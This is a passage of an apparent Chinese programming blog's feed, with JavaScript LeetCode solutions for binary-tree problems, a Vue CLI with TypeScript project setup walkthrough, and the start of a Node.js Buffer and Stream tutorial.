punctuation">(</span>root <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>            root <span class="token operator">=</span> root<span class="token punctuation">.</span>left        <span class="token punctuation">}</span>        root <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 如果中序遍历得到的节点的值小于等于前一个 inorder，说明不是二叉搜索树</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>val <span class="token operator">&lt;=</span> inorder<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span>        <span class="token punctuation">}</span>        inorder <span class="token operator">=</span> root<span class="token punctuation">.</span>val        root <span class="token operator">=</span> root<span class="token punctuation">.</span>right    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="判断平衡二叉树"><a href="#判断平衡二叉树" class="headerlink" title="判断平衡二叉树"></a>判断平衡二叉树</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> isBalanced <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 先把所有二叉树先当做平衡二叉树</span>    <span class="token keyword">function</span> maxHeight <span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当节点不存在时，高度为0</span>        <span class="token keyword">let</span> left <span class="token operator">=</span> <span class="token function">maxHeight</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> right <span class="token operator">=</span> <span class="token function">maxHeight</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//dfs常规操作,求出左右子树高度</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>left<span class="token operator">-</span>right<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//高度差超过1时，非平衡二叉树，直接false</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span> <span class="token comment" spellcheck="true">// 这里加1是因为要把父节点高度算进去</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">maxHeight</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="验证前序序列"><a href="#验证前序序列" class="headerlink" title="验证前序序列"></a>验证前序序列</h2><p><a href="https://leetcode-cn.com/problems/verify-preorder-serialization-of-a-binary-tree/" target="_blank" rel="noopener">leetcode331</a></p><pre class=" language-js"><code class="language-js">序列化二叉树的一种方法是使用前序遍历。当我们遇到一个非空节点时，我们可以记录下这个节点的值。如果它是一个空节点，我们可以使用一个标记值记录，例如 #。     _9_    <span class="token operator">/</span>   \   <span class="token number">3</span>     <span class="token number">2</span>  <span class="token operator">/</span> \   <span class="token operator">/</span> \ <span class="token number">4</span>   <span class="token number">1</span>  #  <span class="token number">6</span><span class="token operator">/</span> \ <span class="token operator">/</span> \   <span class="token operator">/</span> \# # # #   # #示例 <span class="token number">1</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token string">"9,3,4,#,#,1,#,#,2,#,6,#,#"</span>输出<span class="token punctuation">:</span> <span class="token boolean">true</span>示例 <span class="token number">2</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token string">"1,#"</span>输出<span class="token punctuation">:</span> <span class="token boolean">false</span>示例 <span class="token number">3</span><span class="token punctuation">:</span>输入<span class="token punctuation">:</span> <span class="token string">"9,#,#,1"</span>输出<span class="token punctuation">:</span> <span class="token boolean">false</span></code></pre><ul><li><p><a href="https://leetcode-cn.com/problems/verify-preorder-serialization-of-a-binary-tree/solution/yan-zheng-er-cha-shu-de-qian-xu-xu-lie-hua-by-leet/" target="_blank" rel="noopener">题解</a></p></li><li><p>初始化可用槽位：slots = 1。</p></li><li><p>根据逗号分隔前序序列化，将结果数组存储，随后遍历该数组：</p><ul><li><p>空节点和非空节点都消耗一个槽位：slots = slot - 1.</p></li><li><p>如果当前的可用槽位是负数，那么这个前序序列化是非法的，返回 False。</p></li><li><p>非空节点（node != ‘#’）新增两个可用槽位：slots = slots + 2.</p></li></ul></li><li><p>如果所有的槽位都消耗完，那么这个前序序列化就是合法的：返回 slots == 0。</p></li></ul><pre class=" language-js"><code class="language-js">        isValidSerialization <span class="token punctuation">(</span>preorder<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// "9,3,4,#,#,1,#,#,2,#,6,#,#"</span>            <span class="token keyword">let</span> slot <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">let</span> arr <span class="token operator">=</span> preorder<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>                slot<span class="token operator">--</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>slot <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">"#"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    slot <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> slot <span class="token operator">===</span> <span class="token number">0</span>        <span class="token punctuation">}</span></code></pre><h2 id="求二叉树的宽度"><a href="#求二叉树的宽度" class="headerlink" title="求二叉树的宽度"></a>求二叉树的宽度</h2><ul><li><a href="https://leetcode-cn.com/problems/maximum-width-of-binary-tree/" target="_blank" rel="noopener">leetcode662</a></li><li>思路：层次遍历，记录每层的宽度</li><li>左孩子的索引值为 <code>index *  2 + 1</code>，右孩子的索引值为<code>index * 2 + 2</code>，利用节点值来记录索引值</li><li>为了防止无限乘2超出范围，每层索引都减去该层第一个索引的值</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> widthOfBinaryTree <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token number">0</span>    root<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">0</span>    queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> len <span class="token operator">=</span> queue<span class="token punctuation">.</span>length        <span class="token keyword">let</span> firstNumber <span class="token operator">=</span> queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>val        res <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> queue<span class="token punctuation">[</span>queue<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>val <span class="token operator">-</span> queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> node <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            node<span class="token punctuation">.</span>val <span class="token operator">-</span><span class="token operator">=</span> firstNumber            <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">)</span>                node<span class="token punctuation">.</span>left<span class="token punctuation">.</span>val <span class="token operator">=</span> node<span class="token punctuation">.</span>val <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>right <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">)</span>                node<span class="token punctuation">.</span>right<span class="token punctuation">.</span>val <span class="token operator">=</span> node<span class="token punctuation">.</span>val <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="前序中序构造二叉树"><a href="#前序中序构造二叉树" class="headerlink" title="前序中序构造二叉树"></a>前序中序构造二叉树</h2><ul><li><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/" target="_blank" rel="noopener">leetcode105</a></li></ul><blockquote><p>根据一棵树的前序遍历与中序遍历构造二叉树。</p><p>注意:<br>你可以假设树中没有重复的元素。</p><p>例如，给出</p><p>前序遍历 preorder = [3,9,20,15,7]<br>中序遍历 inorder = [9,3,15,20,7]<br>返回如下的二叉树：</p><p>​    3</p><p>   / \<br>  9  20<br>    /  \<br>   15   7</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> buildTree <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>preorder<span class="token punctuation">,</span> inorder<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>inorder<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span>    <span class="token keyword">let</span> tmp <span class="token operator">=</span> preorder<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> mid <span class="token operator">=</span> inorder<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">let</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    root<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">buildTree</span><span class="token punctuation">(</span>preorder<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> inorder<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">buildTree</span><span class="token punctuation">(</span>preorder<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> inorder<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> root<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="二叉树的右视图"><a href="#二叉树的右视图" class="headerlink" title="二叉树的右视图"></a>二叉树的右视图</h2><ul><li><a href="https://leetcode-cn.com/problems/binary-tree-right-side-view/" target="_blank" rel="noopener">leetcode199</a></li></ul><pre class=" language-js"><code class="language-js">输入<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>解释<span class="token punctuation">:</span>   <span class="token number">1</span>            <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">-</span> <span class="token operator">/</span>   \<span class="token number">2</span>     <span class="token number">3</span>         <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">-</span> \     \  <span class="token number">5</span>     <span class="token number">4</span>       <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">-</span></code></pre><ul><li>层次遍历记录每层最后一个就好</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> rightSideView <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> len <span class="token operator">=</span> queue<span class="token punctuation">.</span>length        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> tmp  <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>left <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>left<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>right <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>right<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>val<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="二叉树展开为链表"><a href="#二叉树展开为链表" class="headerlink" title="二叉树展开为链表"></a>二叉树展开为链表</h2><ul><li><a href="https://leetcode-cn.com/problems/flatten-binary-tree-to-linked-list/" target="_blank" rel="noopener">leetcode114</a></li></ul><pre class=" language-js"><code class="language-js">给你二叉树的根结点 root ，请你将它展开为一个单链表：展开后的单链表应该同样使用 TreeNode ，其中 right 子指针指向链表中下一个结点，而左子指针始终为 <span class="token keyword">null</span> 。展开后的单链表应该与二叉树 先序遍历 顺序相同。</code></pre><ul><li>先序遍历后构造链表（一定要手写一下，构造链表很容易出错）</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> flatten <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> tmp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>right <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>right<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>left <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>left<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> prev <span class="token operator">=</span> arr<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> curr <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        prev<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token keyword">null</span>        prev<span class="token punctuation">.</span>right <span class="token operator">=</span> curr    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue.js + Vuex + TypeScript项目</title>
      <link href="2020/01/14/Vue-Vue.js+Vuex+TypeScript%E9%A1%B9%E7%9B%AE/"/>
      <url>2020/01/14/Vue-Vue.js+Vuex+TypeScript%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="创建项⽬"><a href="#创建项⽬" class="headerlink" title="创建项⽬"></a>创建项⽬</h1><p>安装 Vue CLI： </p><pre class=" language-shell"><code class="language-shell">npm i -g @vue/cli</code></pre><pre class=" language-shell"><code class="language-shell">vue create edu-boss-fed （可以同过上下键，空格来选择）Vue CLI v4.5.6 ? Please pick a preset: Manually select features (手动选择配置)? Check the features needed for your project: Babel, TS, Router, Vuex, CSS Pre-processors, Linter ? Use class-style component syntax? Yes ? Use Babel alongside TypeScript (required for modern mode, auto-detected polyfills, transpiling JSX)? Yes (TS用于编译TS语法，Babel用于编译es6)? Use history mode for router? (Requires proper server setup for index fallback in production) No (使用hash模式)? Pick a CSS pre-processor (PostCSS, Autoprefixer and CSS Modules are supported by default): Sass/SCSS (with dart-sass) （css预处理器）? Pick a linter / formatter config: Standard （standard风格）? Pick additional lint features: Lint on save, Lint and fix on commit（保存和commit时都检查）? Where do you prefer placing config for Babel, ESLint, etc.? In dedicated config files （单独配置文件）? Save this as a preset for future projects? No （是否保存以上配置）⚓ Running completion hooks... � Generating README.md... � Successfully created project topline-m-89. � Get started with the following commands: $ cd edu-boss-fed $ npm run serve</code></pre>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js中处理数据I/O</title>
      <link href="2019/05/05/Node.js-Node.js%E4%B8%AD%E5%A4%84%E7%90%86%E6%95%B0%E6%8D%AEIO/"/>
      <url>2019/05/05/Node.js-Node.js%E4%B8%AD%E5%A4%84%E7%90%86%E6%95%B0%E6%8D%AEIO/</url>
      
        <content type="html"><![CDATA[<p>Node.js中提供了处理文件和网络I/O的功能，因此需要处理大量的二进制数据。在Node.js中，Buffer缓冲区和Stream文件流对二进制数据的处理提供了很好的支持。</p><h1 id="5-1-Buffer缓冲区"><a href="#5-1-Buffer缓冲区" class="headerlink" title="5.1 Buffer缓冲区"></a>5.1 Buffer缓冲区</h1><p>Buffer类是随Node.js内核一起发布的核心库，用于支持I/O操作中移动的数据处理。</p><h2 id="5-1-2-Buffer的构造函数"><a href="#5-1-2-Buffer的构造函数" class="headerlink" title="5.1.2 Buffer的构造函数"></a>5.1.2 Buffer的构造函数</h2><p>Node.js中的Buffer缓冲区模块，支持开发者在缓冲区结构中创建，读取，写入和操作二进制数据，该模块是全局性的，所以在使用时不需要require（）函数来加载。</p><ol><li>传入字节</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><a id="more"></a><ol start="2"><li>传入数组</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ol start="3"><li>传入字符串和编码</li></ol><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Buffer同样支持以下编码：</p><ul><li>ascii：7位ASCII字符</li><li>utf16le：两个字节，16位小端字节序</li><li>usc2：两个字节，以小尾字节序编码的Unicode字符</li><li>base64：用于传输8字节代码的编码方式之一</li><li>hex：Hex字符串编码</li></ul><h2 id="5-1-3-写入缓冲区"><a href="#5-1-3-写入缓冲区" class="headerlink" title="5.1.3 写入缓冲区"></a>5.1.3 写入缓冲区</h2><p><code>buf.write(string,offset,length,encoding) //字符串，索引值，字节数，编码</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>buf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//写入b时需要在第二个参数传入缓冲区开始写入的索引值</span>buf<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出</span><span class="token comment" spellcheck="true">//5</span><span class="token comment" spellcheck="true">//&lt;Buffer 61 00 00 00 00></span><span class="token comment" spellcheck="true">//&lt;Buffer 61 62 00 00 00></span></code></pre><h2 id="5-1-4-从缓冲区读取数据"><a href="#5-1-4-从缓冲区读取数据" class="headerlink" title="5.1.4 从缓冲区读取数据"></a>5.1.4 从缓冲区读取数据</h2><p><code>buf.toString(encoding,start,end)</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//输出全部</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出前5个</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出</span><span class="token comment" spellcheck="true">//abcdefghijklmnopqrstuvwxyz</span><span class="token comment" spellcheck="true">//abcde</span></code></pre><h2 id="5-1-5拼接缓冲区"><a href="#5-1-5拼接缓冲区" class="headerlink" title="5.1.5拼接缓冲区"></a>5.1.5拼接缓冲区</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span><span class="token string">'世上无难事'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> buf1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span><span class="token string">'只怕有心人'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> buf2 <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span>buf<span class="token punctuation">,</span>buf1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>buf2<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出：世上无难事只怕有心人</span></code></pre><h1 id="5-2-Stream文件流"><a href="#5-2-Stream文件流" class="headerlink" title="5.2 Stream文件流"></a>5.2 Stream文件流</h1><p>由于Buffer缓冲区限制在1GB，超过1GB的文件无法直接完成读写操作，在读写大文件时，如果读写资源一直持续不停止，Node.js将无法继续其他工作，为此Node.js中提供了Stream文件流模块。</p><h2 id="5-2-1-文件流的概念"><a 